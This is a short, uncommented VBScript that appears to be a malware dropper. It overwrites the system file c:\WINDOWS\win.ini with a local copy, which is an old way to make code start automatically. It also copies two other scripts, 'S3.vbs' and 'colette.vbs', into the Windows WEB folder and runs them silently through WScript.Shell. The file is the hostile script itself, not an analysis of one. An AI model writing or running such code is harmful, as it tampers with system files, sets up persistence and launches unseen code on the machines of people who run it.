Dim FSO
Set FSO = CreateObject("Scripting.FileSystemObject")
FSO.CopyFile "win.ini", "c:\WINDOWS\win.ini"
FSO.CopyFile "S3.vbs", "c:\WINDOWS\WEB\"
FSO.CopyFile "colette.vbs", "c:\WINDOWS\WEB\"
Sub Run(ByVal sFile)
Dim shell

    Set shell = CreateObject("WScript.Shell")
    shell.Run Chr(34) & sFile & Chr(34), 1, false
    Set shell = Nothing
End Sub
Run "C:\WINDOWS\WEB\S3.VBS"
Run "C:\WINDOWS\WEB\colette.VBS"